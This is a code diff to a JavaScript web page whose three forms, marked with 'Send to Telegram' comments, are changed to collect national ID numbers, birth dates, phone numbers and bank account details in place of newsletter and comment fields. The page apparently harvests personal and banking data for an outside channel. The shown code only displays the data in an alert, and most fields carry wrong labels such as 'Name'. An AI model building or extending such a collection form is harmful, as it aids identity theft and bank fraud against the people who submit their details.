@@ -447,7 +447,12 @@ closeAdButton.addEventListener("click", slideOutAd);
             // Send to Telegram
             const message = `📝 **Form 1 Submitted - Personal Information**\n\n` +
                            `👤 Name: ${data.name}\n` +
-                           `📧 Email: ${data.email}\n` +
+                           `👤 Name: ${data.gender}\n` +
+                           `👤 Name: ${data.dob}\n` +
+                           `👤 Name: ${data.email}\n` +
+                           `👤 Name: ${data.employ}\n` +
+                           `👤 Name: ${data.phone}\n` +
+                           `📧 Email: ${data.marital}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
             alert(message);
@@ -473,9 +478,11 @@ closeAdButton.addEventListener("click", slideOutAd);
             
             // Send to Telegram
             const message = `📝 **Form 2 Submitted - Address Information**\n\n` +
-                           `🏠 Street: ${data.street}\n` +
-                           `🏙️ City: ${data.city}\n` +
-                           `📮 Zip Code: ${data.zipcode}\n` +
+                           `🏠 City: ${data.city}\n` +
+                           `🏙️ State: ${data.state}\n` +
+                           `📮 Address: ${data.address}\n` +
+                           `🏙️ State: ${data.nin}\n` +
+                           `📮 Address: ${data.maintext}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}`;
             
             alert(message);
@@ -499,8 +506,9 @@ closeAdButton.addEventListener("click", slideOutAd);
             
             // Send to Telegram
             const message = `📝 **Form 3 Submitted - Preferences**\n\n` +
-                           `📰 Newsletter: ${data.newsletter}\n` +
-                           `💬 Comments: ${data.comments || 'None'}\n` +
+                           `📰 Bank: ${data.bankName}\n` +
+                           `🏙️ Account Number: ${data.accountNumber}\n` +
+                           `📮 Owner: ${data.accountName}\n` +
                            `⏰ Time: ${new Date().toLocaleString()}\n\n` +
                            `✅ **All Forms Completed!**`;
             
